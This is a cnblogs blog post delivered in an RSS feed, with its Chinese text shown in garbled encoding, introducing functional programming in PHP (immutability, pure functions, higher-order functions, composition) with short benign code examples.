<p>FP çä¸ä¸ªæ ¸å¿ååæ¯ä¸å¯åæ§ââä¸æ¦ç»åéèµå¼ï¼å°±ä¸è½åæ¹åãè¿æ¶é¤äºå¯ä½ç¨ï¼è®©ä»£ç æ´å¯é¢æµãæ´å®¹æè°è¯ãå¦ä¸ä¸ªåºæ¬æ¦å¿µæ¯çº¯å½æ°ï¼å¯¹äºç¸åçè¾å¥æ»æ¯äº§çç¸åçè¾åºï¼ä¸ä¼ä¿®æ¹ä»»ä½å¤é¨ç¶æã</p>
<p><a href="https://catchadmin.com/post/2026-01/functional-programming-paradigms-2026" target="_blank" rel="noopener nofollow">åæ 2026 å¹´ PHP å½æ°å¼ç¼ç¨ ä¼å¿ä¸å®éåºç¨</a></p>
<h2 id="ä¸ºä»ä¹å¼åèåºè¯¥å³æ³¨å½æ°å¼ç¼ç¨">ä¸ºä»ä¹å¼åèåºè¯¥å³æ³¨å½æ°å¼ç¼ç¨</h2>
<h3 id="æ´ç®æ´æ´æç»´æ¤çä»£ç ">æ´ç®æ´ãæ´æç»´æ¤çä»£ç </h3>
<p>å½æ°å¼ç¼ç¨é¼å±ç¼åæ¨¡ååãæäºçè§£çä»£ç ãå ä¸ºå½æ°æ¯çº¯çï¼ä¸ä¿®æ¹ç¶æï¼ï¼æå¤è¡ä¸ºçç©ºé´æ´å°ï¼ä»£ç åºæ´å¹²åãè¿è®©è°è¯ãæµè¯ååç»­ä¿®æ¹é½æ´å®¹æã</p>
<p>åè®¾ä½ å¨åä¸ä¸ª PHP é¡¹ç®ãä½¿ç¨å½æ°å¼ææ¯å¯ä»¥åå°å¯ä½ç¨ï¼ç¡®ä¿åºç¨é»è¾è¢«éç¦»ææ´å°çãå¯å¤ç¨çä»£ç çæ®µãè¿ä¹è®©åç»­æ´æ°æéææ´å®¹æï¼å ä¸ºå½æ°å¼ä»£ç çä¾èµéå¸¸æ´å°ã</p>
<h3 id="å¹¶ååå¹¶è¡">å¹¶ååå¹¶è¡</h3>
<p>ç°ä»£è½¯ä»¶çä¸ä¸ªæææ¯å¤çå¹¶ååå¹¶è¡ãéçå¤æ ¸å¤çå¨ååå¸å¼ç³»ç»çæ®åï¼ç¼åè½é«æå¤çå¤ä»»å¡çä»£ç æ¯ä»¥å¾æ´éè¦ã</p>
<p>å½æ°å¼ç¼ç¨å¨è¿æ¹é¢æææ¾ä¼å¿ï¼å ä¸ºå½æ°é¿åä¿®æ¹å±äº«ç¶æï¼å®ä»¬å¤©çæ¯çº¿ç¨å®å¨çãè¿è®©ç¼åå¹¶ååºç¨æ´å®¹æï¼ä¸ç¨æå¿ç«ææ¡ä»¶ææ­»éã</p>
<p>æ¯å¦ä¸ä¸ªéè¦å¤çå¤§æ°æ®éç PHP åºç¨ãä½¿ç¨ä¸å¯åæ°æ®ç»æåå¹¶è¡å¤çææ¯ï¼å¯ä»¥ç¡®ä¿åºç¨çä¸åé¨åå¹¶åè¿è¡èä¸äºç¸å¹²æ°ã</p>
<h3 id="æ´å¥½çæ½è±¡åå¤ç¨">æ´å¥½çæ½è±¡åå¤ç¨</h3>
<p>å½æ°å¼ç¼ç¨ä¿è¿é«å±æ½è±¡çåå»ºãå½æ°å¯ä»¥è½»æ¾ç»åãä¼ éï¼å¨åºç¨çä¸åé¨åå¤ç¨ã</p>
<p>æ¯å¦å¨ PHP ä¸­ï¼ä¸å¶åéå¤çä»£ç å¤çæäºæä½ï¼ä¸å¦åå°ççº¯å½æ°ï¼ç¶åçµæ´»å°ç»åèµ·æ¥ãè¿åå°äºä»£ç éå¤ï¼æ´å¥½å°éµå¾ª DRYï¼Don't Repeat Yourselfï¼ååã</p>
<h3 id="php-ä¸­çå½æ°å¼å·¥å·">PHP ä¸­çå½æ°å¼å·¥å·</h3>
<p>PHP ä¸æ¯çº¯å½æ°å¼è¯­è¨ï¼ä½åç½®ç <code>array_map()</code>ã<code>array_filter()</code>ã<code>array_reduce()</code> ç­å½æ°æä¾äºåºæ¬çå½æ°å¼æä½è½åãç¬¬ä¸æ¹åºå¦ RamdaãLodash ä¹å¯ä»¥ç¨ã</p>
<h2 id="å½æ°å¼ç¼ç¨çæ ¸å¿åå">å½æ°å¼ç¼ç¨çæ ¸å¿åå</h2>
<p>ä¸é¢æ¢è®¨å½æ°å¼ç¼ç¨çä¸äºæ ¸å¿ååï¼ä»¥åå®ä»¬å¨å®éç¼ç¨ä¸­çåºç¨ã</p>
<h3 id="ä¸å¯åæ§">ä¸å¯åæ§</h3>
<p>å¨å½æ°å¼ç¼ç¨ä¸­ï¼æ°æ®æ¯ä¸å¯åçãä¸æ¦è®¾ç½®äºå¼ï¼å°±ä¸è½æ¹åãè¿ä¸ªæ¦å¿µåå°äºä¸å¯åç¶æååç¸å³ç bugï¼ç®åäºå¯¹ç¨åºè¡ä¸ºççè§£ã</p>
<p>PHP ç¤ºä¾ï¼</p>
<pre><code class="language-php">function addItemToList($list, $item) {
    // åå»ºä¸ä¸ªåå«æ°åç´ çæ°åè¡¨
    return array_merge($list, [$item]);
}

$list = [1, 2, 3];
$newList = addItemToList($list, 4);

print_r($list);     // è¾åº: [1, 2, 3]ï¼ååè¡¨ä¸åï¼
print_r($newList);  // è¾åº: [1, 2, 3, 4]ï¼åå«æ°åç´ çæ°åè¡¨ï¼
</code></pre>
<p>è¿ä¸ªä¾å­ä¸­ï¼åå§ç <code>$list</code> ä¿æä¸åï¼å ä¸º PHP æ°ç»æ¯æå¼ä¼ éçãè¿å±ç¤ºäºä¸å¯åæ§ââåå§æ°æ®ç»æè¢«ä¿çï¼è¿åçæ¯åå«æ°åç´ çæ°ç»æã</p>
<h3 id="çº¯å½æ°">çº¯å½æ°</h3>
<p>çº¯å½æ°å¯¹äºç¸åçè¾å¥æ»æ¯äº§çç¸åçè¾åºï¼ä¸ä¼äº§çä»»ä½å¯ä½ç¨ãè¿è®©çº¯å½æ°å¯é¢æµä¸æäºæµè¯ã</p>
<p>PHP ç¤ºä¾ï¼</p>
<pre><code class="language-php">function square($number) {
    return $number * $number;
}

echo square(4); // è¾åº: 16
</code></pre>
<p><code>square()</code> å½æ°æ¯çº¯çï¼å ä¸ºå¯¹äºç¸åçè¾å¥ï¼4ï¼æ»æ¯äº§çç¸åçè¾åºï¼16ï¼ï¼èä¸ä¸ä¿®æ¹ä»»ä½å¤é¨ç¶æã</p>
<h3 id="é«é¶å½æ°">é«é¶å½æ°</h3>
<p>é«é¶å½æ°æ¯å¯ä»¥æ¥åå¶ä»å½æ°ä½ä¸ºåæ°æè¿åå½æ°çå½æ°ãè¿å®ç°äºå¼ºå¤§çæ½è±¡åä»£ç å¤ç¨ã</p>
<p>PHP ç¤ºä¾ï¼</p>
<pre><code class="language-php">function applyFunction($func, $value) {
    return $func($value);
}

function double($x) {
    return $x * 2;
}

echo applyFunction('double', 5); // è¾åº: 10
</code></pre>
<p>è¿ä¸ªä¾å­ä¸­ï¼<code>applyFunction()</code> æ¯ä¸ä¸ªé«é¶å½æ°ï¼å ä¸ºå®æ¥åå¦ä¸ä¸ªå½æ°ï¼<code>double()</code>ï¼ä½ä¸ºåæ°å¹¶åºç¨å°ä¸ä¸ªå¼ä¸ã</p>
<h3 id="å½æ°ç»å">å½æ°ç»å</h3>
<p>å½æ°ç»åæ¯æç®åå½æ°ç»åææ´å¤æå½æ°çè¿ç¨ãè¿è®©ä½ å¯ä»¥ä»æ´å°çãå¯å¤ç¨çç»ä»¶æå»ºå¤æè¡ä¸ºã</p>
<p>PHP ç¤ºä¾ï¼</p>
<pre><code class="language-php">function add($x, $y) {
    return $x + $y;
}

function multiply($x, $y) {
    return $x * $y;
}

function addThenMultiply($x, $y, $z) {
    return multiply(add($x, $y), $z);
}

echo addThenMultiply(2, 3, 4); // è¾åº: 20ï¼add(2, 3) = 5, multiply(5, 4) = 20ï¼
</code></pre>
<p>è¿éï¼<code>addThenMultiply()</code> å½æ°å±ç¤ºäºå¦ä½ææ´å°çå½æ°ç»åèµ·æ¥åå»ºæ°åè½ãè¿é¼å±ä»£ç å¤ç¨åæ¨¡ååã</p>
<h2 id="å½æ°å¼ç¼ç¨çå®éåºç¨">å½æ°å¼ç¼ç¨çå®éåºç¨</h2>
<p>å½æ°å¼ç¼ç¨ä¸åªæ¯çè®ºæ¦å¿µââå®æ­£å¨å®éåºç¨ä¸­ä½¿ç¨ãä¸é¢ççå½æ°å¼ç¼ç¨å¨ä¸åé¢åçä¸äºå®éä¾å­ã</p>
<h3 id="æ°æ®è½¬æ¢å-etl-æµç¨">æ°æ®è½¬æ¢å ETL æµç¨</h3>
<p>å¨æ°æ®å¯éååºç¨ä¸­ï¼æ¯å¦æ°æ®è½¬æ¢æ ETLï¼Extract, Transform, Loadï¼æµç¨ï¼å½æ°å¼ç¼ç¨è¡¨ç°åºè²ãå®è®©å¼åèå¯ä»¥ä¸å¯åå°æä½å¤§æ°æ®éï¼ä½¿ç¨é«å±æ½è±¡è¿è¡è½¬æ¢ã</p>
<p>PHP ç¤ºä¾ï¼</p>
<pre><code class="language-php">$data = [1, 2, 3, 4, 5];

// ä½¿ç¨å½æ°å¼æ¹æ³å¤çæ°æ®
$result = array_map(fn($x) =&gt; $x * 2, $data);  // æ¯ä¸ªå¼ç¿»å
$result = array_filter($result, fn($x) =&gt; $x &gt; 5); // åªä¿çå¤§äº 5 çå¼

print_r($result);  // è¾åº: [6, 8, 10]
</code></pre>
<p>è¿ä¸ªä¾å­ä¸­ï¼æä»¬ä½¿ç¨ <code>array_map()</code> å <code>array_filter()</code> ä¸å¯åå°è½¬æ¢åè¿æ»¤æ°æ®éï¼è¿æ¯å½æ°å¼ç¼ç¨ä¸­çå¸¸è§æ¨¡å¼ã</p>
<h3 id="åå¸å¼ç³»ç»ä¸­çå¹¶å">åå¸å¼ç³»ç»ä¸­çå¹¶å</h3>
<p>å½æ°å¼ç¼ç¨å¯¹ä¸å¯åæ§åçº¯å½æ°çå¼ºè°ï¼ä½¿å®æä¸ºå¹¶ååå¹¶è¡å¤çä»»å¡ççæ³éæ©ãä½ å¯ä»¥æ¾å¿å°ç¼åå¹¶ååºç¨ï¼ä¸ç¨æå¿ç«ææ¡ä»¶ã</p>
<p>æ¯å¦ï¼å¨ PHP ä¸­æå»ºä¸ä¸ªå¹¶åå¤çç¨æ·è¯·æ±çåå¸å¼ç³»ç»æ¶ï¼å¯ä»¥ç¡®ä¿æ°æ®å®æ´æ§ï¼èä¸ä¼å¼å¥ä¸å¯åå±äº«ç¶æç¸å³ç bugã</p>
<h3 id="æå»º-api-ç«¯ç¹åå¾®æå¡">æå»º API ç«¯ç¹åå¾®æå¡</h3>
<p>æå»ºå¾®æå¡æ API æ¶ï¼å½æ°å¼ç¼ç¨å¯ä»¥å¸®å©åå»ºç®æ´ãæç»´æ¤çç«¯ç¹ãéè¿ç¡®ä¿æ¯ä¸ªå½æ°å¤çç¹å®ä»»å¡ä¸æ¯çº¯çãç¡®å®æ§çï¼å¯ä»¥è®©æ¯ä¸ªå¾®æå¡æ´å®¹ææµè¯åæ©å±ã</p>
<h2 id="å°ç»">å°ç»</h2>
<p>å½æ°å¼ç¼ç¨çæ ¸å¿æ¯ä¸å¯åæ§ãçº¯å½æ°åé«é¶å½æ°ãè¿äºæ¦å¿µå¨å¹¶åå¤çãæ°æ®è½¬æ¢ç­åºæ¯ä¸æ¯è¾å®ç¨ãPHP è½ç¶ä¸æ¯çº¯å½æ°å¼è¯­è¨ï¼ä½åç½®å½æ°åç¬¬ä¸æ¹åºå·²ç»æä¾äºè¶³å¤çæ¯æã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-18 08:27">2026-01-18 08:26</span>&nbsp;
<a href="https://www.cnblogs.com/catchadmin">JaguarJack</a>&nbsp;
éè¯»(<span id="post_view_count">51</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19497758);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19497758', targetLink: 'https://www.cnblogs.com/catchadmin/p/19497758', title: '2026 å¹´ PHP å½æ°å¼ç¼ç¨ ä¼å¿ä¸å®éåºç¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>